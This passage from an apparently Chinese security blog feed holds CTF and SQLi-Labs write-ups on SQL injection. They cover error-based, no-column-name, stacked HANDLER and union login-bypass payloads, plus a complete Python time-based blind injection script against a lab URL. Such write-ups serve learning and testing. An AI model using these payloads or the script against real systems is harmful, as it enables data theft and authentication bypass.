class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,exp(~(select * from (select database())x))--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆表</span><br><span class="hljs-string">http://192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x))<span class="hljs-comment">--+</span><br><br>#爆字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,exp(~(select * from(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1)x))--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆值</span><br><span class="hljs-string">http://192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SWPU2019 Web1 无列名注入</title>
    <link href="/2022/03/03/SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/03/SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="SWPU2019-Web1-无列名注入"><a href="#SWPU2019-Web1-无列名注入" class="headerlink" title="[SWPU2019]Web1 无列名注入"></a>[SWPU2019]Web1 无列名注入</h3><p>12&#x2F;13&#x2F;2020</p><p>雪   狂风怒号</p><p>冬天的第一场雪啊 期盼已久~ 虽然跟我没啥关系</p><p>今天做的这一道题真难 知识点挺多的</p><p>拿到这一题首先是登录框 还有注册 先注册一个登陆后发现可以申请广告发布</p><p>先发布一个1’试试 发布后查看 发现报错信息 可以断定是SQL注入了 注入点为 标题框tittle</p><p>先bp fuzzing一波  发现or 空格等被过滤</p><p>空格可以使用&#x2F;**&#x2F;过滤 order by 不能使用  所以使用group by判断列数</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/**/gruop/**/by/**/1,&#x27;</span><br></code></pre></td></tr></table></figure><p>后面的1依次递增到23的时候报错说明有22个字段</p><p>判断回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></code></pre></td></tr></table></figure><p>为2，3<br>查询数据库的版本信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></code></pre></td></tr></table></figure><p>发现是马里奥数据库<br>根据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">https://mariadb.com/kb/en/mysqlinnodb_table_stats/<br></code></pre></td></tr></table></figure><p>绕过information_schema不能用的问题</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></code></pre></td></tr></table></figure><p>得到表名 再往后就查不到列名了  </p><p>无列名注入<br>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p><p>在 mysql &#x3D;&gt; 5 的版本中存在一个名为 information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p><p>使用条件&amp;方法</p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p><p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><p>正常的 sql 查询如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin`;<br></code></pre></td></tr></table></figure><p>其中，列名为 id、name、password，使用 union 查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin;<br><br></code></pre></td></tr></table></figure><p>我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">3</span>` <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a;<br><br></code></pre></td></tr></table></figure><p>末尾的 a 可以是任意字符，用于命名。</p><p>当然，多数情况下，&#96;会被过滤。当不能使用的时候，使用别名来代替：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a;<br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select * from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></code></pre></td></tr></table></figure><p>获得flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GYCTF2020 Blacklist 堆叠注入 handler</title>
    <link href="/2022/03/03/GYCTF2020-Blacklist-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-handler/"/>
    <url>/2022/03/03/GYCTF2020-Blacklist-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-handler/</url>
    
    <content type="html"><![CDATA[<h3 id="GYCTF2020-Blacklist-堆叠注入-handler"><a href="#GYCTF2020-Blacklist-堆叠注入-handler" class="headerlink" title="[GYCTF2020]Blacklist 堆叠注入 handler"></a>[GYCTF2020]Blacklist 堆叠注入 handler</h3><p>11&#x2F;29&#x2F;2020</p><p>晴    正常</p><p>这一题考察的是堆叠注入跟 强网杯 2019 随便注这一题很像</p><p>利用burp suite进行fuzzing测试 出现提示</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="hljs-variable">$inject</span>);<br></code></pre></td></tr></table></figure><p>过滤了这些函数</p><p>使用堆叠注入查看数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;</span><br></code></pre></td></tr></table></figure><p>查看数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables;</span><br></code></pre></td></tr></table></figure><p>查看表结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;desc `FlagHere`;</span><br></code></pre></td></tr></table></figure><p>下面我们要介绍handler函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。<br></code></pre></td></tr></table></figure><p>2 基本语法<br>handler语句的语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql">HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br><br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,...)<br> [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125;<br> [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125;<br> [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br><br>通过HANDLER tbl_name <span class="hljs-keyword">OPEN</span>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ <span class="hljs-keyword">FIRST</span>获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name <span class="hljs-keyword">CLOSE</span>来关闭打开的句柄。<br><br>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name <span class="hljs-keyword">FIRST</span>，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，<span class="hljs-keyword">LAST</span>获取最后一行（索引最大的一行）。<br><br>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name <span class="hljs-operator">=</span> <span class="hljs-keyword">value</span>，指定从哪一行开始，通过NEXT继续浏览。<br></code></pre></td></tr></table></figure><p>下面根据handler函数构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</span><br></code></pre></td></tr></table></figure><p>提交payload得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXYCTF2019 BabySQli</title>
    <link href="/2022/03/03/GXYCTF2019-BabySQli/"/>
    <url>/2022/03/03/GXYCTF2019-BabySQli/</url>
    
    <content type="html"><![CDATA[<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>11&#x2F;26&#x2F;2020</p><p>阴雨  正常</p><p>查看网页源代码 发现search.php</p><p>访问search.php 发现</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5<br></code></pre></td></tr></table></figure><p>尝试base32+base64解密后得到select * from user where username &#x3D; ‘$name’</p><p>接下来进行fuzzing 测试  在测试admin字段时得到回应 wrong pass 说明用户是admin</p><p>测试字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Order by 4#</span><br></code></pre></td></tr></table></figure><p>只有3个字段<br>使用联合注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;</span>admin<span class="hljs-string">&#x27;,2,3</span><br></code></pre></td></tr></table></figure><p>回显wrong user<br>说明用户名不在第一列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,&#x27;</span>admin<span class="hljs-string">&#x27;,3</span><br></code></pre></td></tr></table></figure><p>回显wrong pass</p><p>知识点<br>当查询的数据不存在时，联合查询就会构造一个虚拟的数据</p><p>输入admin，密码为md5(123456)，代入查询时MySQL里面就会生成admin，123456的用户</p><p>同时使用123456密码进行登录，就可以绕过限制</p><p>利用这个知识点  我们可以构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,&#x27;</span>admin<span class="hljs-string">&#x27;,&#x27;</span>e10adc3949ba59abbe56e057f20f883e<span class="hljs-string">&#x27;--+&amp;pw=123456</span><br></code></pre></td></tr></table></figure><p>POST提交数据即可获得flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLi-Labs Less-62 延时注入 python脚本</title>
    <link href="/2022/03/03/SQLi-Labs-Less-62-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-python%E8%84%9A%E6%9C%AC/"/>
    <url>/2022/03/03/SQLi-Labs-Less-62-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-python%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h3 id="SQLi-Labs-Less-62-延时注入-python脚本"><a href="#SQLi-Labs-Less-62-延时注入-python脚本" class="headerlink" title="SQLi-Labs Less-62 延时注入 python脚本"></a>SQLi-Labs Less-62 延时注入 python脚本</h3><p>11&#x2F;25&#x2F;2020 </p><p>雨   正常 乏</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> datetime<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bool_Sql_Inject</span>(<span class="hljs-title class_ inherited__">object</span>):<br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>     self.url = <span class="hljs-string">&quot;http://192.168.253.130/sql/Less-62/&quot;</span><br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">database_length</span>(<span class="hljs-params">self</span>):<br>     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>         payload = self.url + <span class="hljs-string">&quot;?id=1&#x27;) and if(length(database())=&#123;&#125;,sleep(3),1)--+&quot;</span>.<span class="hljs-built_in">format</span>(i)<br><br>         time_start = datetime.datetime.now()<br><br>         <span class="hljs-built_in">print</span>(payload)<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在测试第&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;位&quot;</span>)<br><br>         response = requests.get(url=payload)<br><br>         time_end = datetime.datetime.now()<br><br>         t = (time_end - time_start).seconds<br><br>         <span class="hljs-keyword">if</span> t &gt;= <span class="hljs-number">2</span>:<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;database length is &#x27;</span> + <span class="hljs-built_in">str</span>(i))<br>             <span class="hljs-keyword">break</span><br>         <span class="hljs-keyword">else</span>:<br>             <span class="hljs-keyword">pass</span><br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">database_name</span>(<span class="hljs-params">self</span>):<br>     name = <span class="hljs-string">&#x27;&#x27;</span><br>     <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):<br>         <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:<br>             payload = self.url + <span class="hljs-string">&quot;?id=1&#x27;) and if(substr((select database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(3),1) --+&quot;</span>.<span class="hljs-built_in">format</span>(j, i)<br><br>             time_start = datetime.datetime.now()<br>             <span class="hljs-built_in">print</span>(payload)<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试第&#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27;位&#x27;</span>)<br><br>             response = requests.get(url=payload)<br><br>             time_end = datetime.datetime.now()<br><br>             t = (time_end - time_start).seconds<br><br>             <span class="hljs-keyword">if</span> t &gt;= <span class="hljs-number">3</span>:<br>                 name += i<br>                 <span class="hljs-keyword">break</span><br>             <span class="hljs-keyword">else</span>:<br>                 <span class="hljs-keyword">pass</span><br><br>     <span class="hljs-keyword">return</span> name<br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">table_count</span>(<span class="hljs-params">self</span>):<br>     <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>         payload = self.url + <span class="hljs-string">&quot;?id=1&#x27;) and if((select count(table_name) from information_schema.tables where table_schema\</span><br><span class="hljs-string">         =&#x27;challenges&#x27;)=&#123;&#125;,sleep(2),1) --+&quot;</span>.<span class="hljs-built_in">format</span>(j)<br><br>         time_start = datetime.datetime.now()<br><br>         response = requests.get(url=payload)<br><br>         time_end = datetime.datetime.now()<br><br>         t = (time_end - time_start).seconds<br><br>         <span class="hljs-keyword">if</span> t &gt;= <span class="hljs-number">2</span>:<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;table count is &#x27;</span> + <span class="hljs-built_in">str</span>(j))<br>             <span class="hljs-keyword">break</span><br><br>         <span class="hljs-keyword">else</span>:<br>             <span class="hljs-keyword">pass</span><br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">table_length</span>(<span class="hljs-params">self</span>):<br>     x = <span class="hljs-string">&quot;0&quot;</span><br>     one = Bool_Sql_Inject()<br>     database_name = one.database_name()<br>     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):<br>         payload = self.url + <span class="hljs-string">&quot;?id=1&#x27;) and if(length((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit 0,1))=&#123;&#125;,sleep(3),1)--+&quot;</span>.<span class="hljs-built_in">format</span>(<br>             database_name, i)<br><br>         time_start = datetime.datetime.now()<br><br>         <span class="hljs-built_in">print</span>(payload)<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在测试第&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;位&quot;</span>)<br><br>         response = requests.get(url=payload)<br><br>         time_end = datetime.datetime.now()<br><br>         t = (time_end - time_start).seconds<br><br>         <span class="hljs-keyword">if</span> t &gt;= <span class="hljs-number">3</span>:<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;table length is &#x27;</span> + <span class="hljs-built_in">str</span>(i))<br>             <span class="hljs-keyword">break</span><br>         <span class="hljs-keyword">else</span>:<br>             <span class="hljs-keyword">pass</span><br><br>     <span class="hljs-keyword">return</span> database_name<br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">table_name</span>(<span class="hljs-params">self</span>):<br>     one = Bool_Sql_Inject()<br>     database_name = one.database_name()<br>     name = <span class="hljs-string">&#x27;&#x27;</span><br>     <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):<br>         <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:<br>             payload = self.url + <span class="hljs-string">&quot;?id=1&#x27;) and if(substr((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(3),1) --+&quot;</span>.<span class="hljs-built_in">format</span>(<br>                 database_name, j, i)<br>             time_start = datetime.datetime.now()<br>             <span class="hljs-built_in">print</span>(payload)<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试第&#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27;位&#x27;</span>)<br><br>             response = requests.get(url=payload)<br><br>             time_end = datetime.datetime.now()<br><br>             t = (time_end - time_start).seconds<br><br>             <span class="hljs-keyword">if</span> t &gt;= <span class="hljs-number">3</span>:<br>                 name += i<br>                 <span class="hljs-keyword">break</span><br>             <span class="hljs-keyword">else</span>:<br>                 <span class="hljs-keyword">pass</span><br><br>     <span class="hljs-built_in">print</span>(name)<br><br><br>start = Bool_Sql_Inject()<br>start.table_name()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF Script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hack World SQL注入自动化原理(盲注)</title>
    <link href="/2022/03/03/Hack-World-SQL%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8E%9F%E7%90%86-%E7%9B%B2%E6%B3%A8/"/>
    <url>/2022/03/03/Hack-World-SQL%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8E%9F%E7%90%86-%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World-SQL注入自动化原理-盲注"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World-SQL注入自动化原理-盲注" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World SQL注入自动化原理(盲注)"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World SQL注入自动化原理(盲注)</h3><p>11&#x2F;23&#x2F;2020</p><p>雨  寒风刺骨</p><p>今天一下午都在研究bool盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs sql">Length（）函数 返回字符串的长度<br>Substr（）截取字符串<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br></code></pre></td></tr></table></figure><p>可使用burp suite进行fuzzing测试 测试哪些函数被过滤</p><p>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p><p>爆数据库</p><p>数据库，也就是当前数据库，思路：数据库长度-&gt;根据长度判断每一位</p><p>数据库长度payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span 